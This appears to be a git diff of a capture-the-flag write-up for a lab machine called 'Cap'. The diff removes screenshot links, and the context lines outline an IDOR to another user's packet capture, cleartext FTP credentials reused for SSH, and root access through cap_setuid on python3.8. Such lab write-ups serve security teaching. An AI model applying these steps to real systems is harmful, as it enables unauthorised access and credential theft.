@@ -35,8 +35,6 @@ PORT   STATE SERVICE VERSION
 80/tcp open  http    gunicorn
 ```
 
-![Nmap scan of the target](../images/cap-01-nmap.png)
-
 ### Web application
 
 Port 80 serves a "Security Dashboard" (a Flask/gunicorn app). The sidebar exposes three
@@ -63,8 +61,6 @@ session**. Manually requesting a lower ID returns someone else's capture:
 http://10.129.x.x/data/0
 ```
 
-![Browsing /data/0 to reach another user's capture via IDOR](../images/cap-02-idor-data0.png)
-
 Download the pcap for capture `0` and open it in Wireshark (or `tshark`):
 
 ```bash
@@ -78,8 +74,6 @@ The capture contains a cleartext **FTP** session. Following the TCP stream revea
 USER nathan
 PASS <redacted-ftp-password>
 ```
-
-![Wireshark follow-TCP-stream showing nathan's cleartext FTP credentials](../images/cap-03-wireshark-ftp-creds.png)
 
 ### Credential reuse → SSH
 
@@ -105,8 +99,6 @@ getcap -r / 2>/dev/null
 /usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
 ```
 
-![getcap showing cap_setuid on python3.8](../images/cap-04-getcap-setuid.png)
-
 `cap_setuid` lets the binary change its UID without being SUID-root. Python can therefore
 set its own UID to 0 and execute a shell:
 
@@ -118,7 +110,5 @@ set its own UID to 0 and execute a shell:
 root@cap:~# id
 uid=0(root) gid=1001(nathan) groups=1001(nathan)
 ```
-
-![Root shell via python os.setuid(0)](../images/cap-05-root-shell.png)
 
 The **root flag** is at `/root/root.txt`.
